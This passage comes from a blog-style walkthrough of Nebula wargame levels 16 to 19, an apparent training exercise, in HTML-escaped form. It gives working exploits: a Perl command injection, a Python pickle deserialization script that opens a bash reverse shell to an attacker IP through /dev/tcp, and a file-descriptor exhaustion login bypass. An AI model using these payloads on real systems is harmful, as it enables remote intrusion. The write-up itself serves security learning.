  &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

  &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/a-z/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Z&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# conver to uppercase&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;s/\s.*//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# strip everything after a space&lt;/span&gt;

  &lt;span class=&quot;nv&quot;&gt;@output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`egrep &quot;^$username&quot; /home/flag16/userdb.txt 2&amp;gt;&amp;amp;1`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;@output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$usr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/:/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;htmlz&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Login resuls&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your login was accepted&amp;lt;br/&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your login failed&amp;lt;br/&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;    
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Would you like a cookie?&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;htmlz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Looking at the above script, the following line is vulnerable to command/argument injection.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@output = `egrep &quot;^$username&quot; /home/flag16/userdb.txt 2&amp;gt;&amp;amp;1`;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;However, the above script will turn the user provided username to uppercase and will strip everything after a space (line11 and line12). An easy way to bypass this is to use backticks with the following payload where exploit is a bash script: &lt;code class=&quot;highlighter-rouge&quot;&gt;/*/EXPLOIT.SH&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Within the bash script, the following payload can be inserted.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level16@nebula:~$ cat /tmp/EXPLOIT.SH 
#!/bin/bash
getflag &amp;gt; /tmp/flag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This is needed because it is not possible to inject directly into the script and view results directly.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level16@nebula:~$ vi /tmp/EXPLOIT
level16@nebula:~$ nc 127.0.0.1 1616
GET /index.cgi?username=%24%28%2F%2A%2FEXPLOIT.SH%29&amp;amp;password=
Content-type: text/html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can then be run to execute the &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; command as the flag16 user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/level16.png&quot; alt=&quot;alt text&quot; title=&quot;level16&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level-17&quot;&gt;Level 17&lt;/h2&gt;

&lt;p&gt;Level 17 states that a python script is running on port 10007 that contains a vulnerability. The source code of this program is shown below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pickle&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;signal&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGCHLD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIG_IGN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;clnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;why did you send me &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10007&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;clnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;clnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accepted connection from &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above program takes data via a network socket, uses pickle (serialization) and then prints the data back. The pickle module within is not secure against data provided by user input and can result in deserialization attacks.&lt;/p&gt;

&lt;p&gt;The following attacker script can be used to take a command such as &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.12/4444 0&amp;gt;&amp;amp;1&lt;/code&gt; which when executed will run bash, open a network socket and will bind bash and connect back to an attacker controlled IP address.&lt;/p&gt;

&lt;p&gt;This is the serialized using pickle and this data is then written to a file.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import pickle
import sys
import base64
import os

COMMAND = &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.12/4444 0&amp;gt;&amp;amp;1&quot;

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))


os.system(&quot;touch exploit&quot;)
with open('exploit', &quot;wb&quot;) as exploit:
    pickle.dump(PickleRce(),exploit, pickle.HIGHEST_PROTOCOL)     
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This data can now be sent to the python script.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;snoopy@snoopy-XPS-15-9570:~$ cat exploit 
�cposix
system
qU*bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.12/4444 0&amp;gt;&amp;amp;1q�qRq.snoopy@snoopy-XPS-15-9570:~$ cat exploit | nc -nv 192.168.1.24 10007
Connection to 192.168.1.24 10007 port [tcp/*] succeeded!
Accepted connection from 192.168.1.12:33428
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This will then connect back to a netcat listener listening on port 4444.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/level17.png&quot; alt=&quot;alt text&quot; title=&quot;level17&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level-18&quot;&gt;Level 18&lt;/h2&gt;

&lt;p&gt;Level 18 provides the source code for the following C program. It is also stated that there are multiple ways to complete this challenge.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;getopt.h&amp;gt;

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE &quot;/home/flag18/password&quot;

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, &quot;r&quot;);
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf(&quot;Unable to read password file %s\n&quot;, PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;       
  }
  dprintf(&quot;logged in successfully (with%s password file)\n&quot;,
      fp == NULL ? &quot;out&quot; : &quot;&quot;);
  
  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&amp;amp;buffer, &quot;--&amp;gt; [%s] is unsupported at this current time.\n&quot;, what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, &quot;unable to set user to '%s' -- not supported.\n&quot;, user);
  printf(&quot;%s\n&quot;, msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, &quot;d:v&quot;)) != -1) {
      switch(c) {
          case 'd':
              globals.debugfile = fopen(optarg, &quot;w+&quot;);
              if(globals.debugfile == NULL) err(1, &quot;Unable to open %s&quot;, optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case 'v':
              globals.verbose++;
              break;
      }
  }

  dprintf(&quot;Starting up. Verbose level = %d\n&quot;, globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());
  
  while(1) {
      char line[256];
      char *p, *q;

      q = fgets(line, sizeof(line)-1, stdin);
      if(q == NULL) break;
      p = strchr(line, '\n'); if(p) *p = 0;
      p = strchr(line, '\r'); if(p) *p = 0;

      dvprintf(2, &quot;got [%s] as input\n&quot;, line);

      if(strncmp(line, &quot;login&quot;, 5) == 0) {
          dvprintf(3, &quot;attempting to login\n&quot;);
          login(line + 6);
      } else if(strncmp(line, &quot;logout&quot;, 6) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, &quot;shell&quot;, 5) == 0) {
          dvprintf(3, &quot;attempting to start shell\n&quot;);
          if(globals.loggedin) {
              execve(&quot;/bin/sh&quot;, argv, envp);
              err(1, &quot;unable to execve&quot;);
          }
          dprintf(&quot;Permission denied\n&quot;);
      } else if(strncmp(line, &quot;logout&quot;, 4) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, &quot;closelog&quot;, 8) == 0) {
          if(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile = NULL;
      } else if(strncmp(line, &quot;site exec&quot;, 9) == 0) {
          notsupported(line + 10);
      } else if(strncmp(line, &quot;setuser&quot;, 7) == 0) {
          setuser(line + 8);
      }
  }

  return 0;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Looking at the main function, the program looks for &lt;code class=&quot;highlighter-rouge&quot;&gt;-d&lt;/code&gt; file which enables logging to the provided log file and &lt;code class=&quot;highlighter-rouge&quot;&gt;-v&lt;/code&gt;` to increase the verbosity level.&lt;/p&gt;

&lt;p&gt;One interesting thing to note right away is the following code block which opens the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/flag18/password&lt;/code&gt; file and compares the input against the contents of that file.&lt;/p&gt;

&lt;p&gt;A problem here arises because &lt;code class=&quot;highlighter-rouge&quot;&gt;global.loggedin = 1&lt;/code&gt; is outside of the &lt;code class=&quot;highlighter-rouge&quot;&gt;if(fp)&lt;/code&gt; block. As such, if an &lt;code class=&quot;highlighter-rouge&quot;&gt;fopen()&lt;/code&gt; call returns NULL, it is possible to skip the if conditional block and be &lt;code class=&quot;highlighter-rouge&quot;&gt;loggedin&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
#define PWFILE &quot;/home/flag18/password&quot;

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, &quot;r&quot;);
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf(&quot;Unable to read password file %s\n&quot;, PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;       
  }
  dprintf(&quot;logged in successfully (with%s password file)\n&quot;,
      fp == NULL ? &quot;out&quot; : &quot;&quot;);
  
  globals.loggedin = 1;

}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;One way to get the &lt;code class=&quot;highlighter-rouge&quot;&gt;fopen()&lt;/code&gt; call to return NULL is by exhausting the system’s available file descriptors. For each Linux system, there are limits defined for the maximum amount of files that can be opened. THe below command shows the amount of descriptors presently allocated and the maximum descriptors that can be used.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level18@nebula:~$ sysctl fs.file-nr
fs.file-nr = 352	0	100898
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Looking at the above output, 320 out of 100898 file descriptors are currently being used.&lt;/p&gt;

&lt;p&gt;However, there are some limits defined for how many files can be opened per process; &lt;code class=&quot;highlighter-rouge&quot;&gt;ulimit -a&lt;/code&gt; command can be used to get this information. The &lt;code class=&quot;highlighter-rouge&quot;&gt;H&lt;/code&gt; option within ulimit can be used to get Hard limits. This requires root privileges to modify. The &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt; option within ulimit can be used to get Soft limits. This option can be modified by the current user:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level18@nebula:~$ ulimit -Sa |grep files
open files                      (-n) 1024
level18@nebula:~$ ulimit -Ha |grep files
open files                      (-n) 4096
level18@nebula:~$ 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;By knowing that 1024 is the open file limit, one way to solve this challenge is to exhaust the  filedescriptors up all system file handlers and then call the flag18 program’s login command that will fail opening the password file and will set the loggedin flag to 1. 3 descriptors should also be spared for stdin, stdout and stderr so it is possible to run &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; after running the program.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level18@nebula:/tmp$ python -c 'print(&quot;login foo\n&quot;*1021)' &amp;gt; /home/level18/foo
level18@nebula:/tmp$ python -c 'print(&quot;closelog&quot;)' &amp;gt;&amp;gt; /home/level18/foo
level18@nebula:/tmp$  python -c 'print(&quot;shell&quot;)' &amp;gt;&amp;gt; /home/level18/foo
level18@nebula:/tmp$ cat /home/level18/foo | /home/flag18/flag18 -d /dev/tty
Starting up. Verbose level = 0
logged in successfully (without password file)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The above python script tries to login 1021 times, closes the connection and gets a system shell. This can then be used to run the flag program and a /dev/tty
can be specified to get a shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/level18-1.png&quot; alt=&quot;alt text&quot; title=&quot;level18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the above command, anything specified after the &lt;code class=&quot;highlighter-rouge&quot;&gt;-d&lt;/code&gt; parameter and anything following it to be ignored. We can achieve this by passing either &lt;code class=&quot;highlighter-rouge&quot;&gt;--init-file&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;--rcfile&lt;/code&gt; as our first argument to flag18. The &lt;code class=&quot;highlighter-rouge&quot;&gt;-d&lt;/code&gt; parameter will then be ignored by bash.&lt;/p&gt;

&lt;h2 id=&quot;level-19&quot;&gt;Level 19&lt;/h2&gt;

&lt;p&gt;Level 19 provides the following source and mentions that there is a flaw in the below program in how it operates.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

